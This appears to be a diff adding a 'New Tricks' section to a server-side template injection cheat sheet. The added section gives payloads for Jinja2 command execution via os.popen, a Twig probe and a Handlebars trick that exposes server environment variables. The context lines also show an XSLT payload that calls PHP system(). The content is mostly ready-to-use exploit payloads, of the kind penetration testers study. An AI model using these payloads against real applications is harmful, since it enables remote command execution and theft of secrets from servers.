@@ -56,3 +56,17 @@ XML
 ```xml
 <xsl:value-of select="php:function('system','id')" />
 ```
+
+## New Tricks
+
+### Trick 1
+- Scenario: Jinja2 expression executed command through unsafe template render.
+- Payload: `{{ cycler.__init__.__globals__.os.popen("id").read() }}`
+
+### Trick 2
+- Scenario: Twig math probe confirmed SSTI before full exploit chain.
+- Payload: `{{7*7}}`
+
+### Trick 3
+- Scenario: Handlebars helper abuse exposed server environment variables.
+- Payload: `{{#with "s" as |x|}}{{lookup ../this "process".env}}{{/with}}`
